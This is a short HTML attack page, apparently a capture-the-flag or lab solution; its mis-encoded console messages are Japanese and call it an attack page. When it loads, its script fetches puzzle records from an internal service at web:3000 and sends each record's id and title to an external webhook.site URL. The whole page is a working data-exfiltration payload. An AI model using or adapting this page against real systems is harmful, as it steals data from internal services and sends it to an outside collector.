<!DOCTYPE html>
<html>
<body>
  <script>
    console.log("ğŸ”¥ æ”»æ’ƒãƒšãƒ¼ã‚¸ãŒå®Ÿè¡Œã•ã‚ŒãŸ");

    fetch("http://web:3000/puzzles")
      .then(r => {
        console.log("ğŸ“¥ /puzzles ãƒ¬ã‚¹ãƒãƒ³ã‚¹å—ä¿¡");
        return r.json();
      })
      .then(puzzles => {
        console.log("ğŸ“¦ puzzles = ", puzzles);
        puzzles.forEach(p => {
          const url = "https://webhook.site/00757dd8-0903-4a93-94b1-454f8b6e8fe6"
            + "?id=" + encodeURIComponent(p.id)
            + "&title=" + encodeURIComponent(p.title);
          console.log("ğŸš€ Sending to webhook:", url);
          fetch(url);
        });
      })
      .catch(err => {
        console.error("âŒ fetch error:", err);
      });
  </script>
</body>
</html>

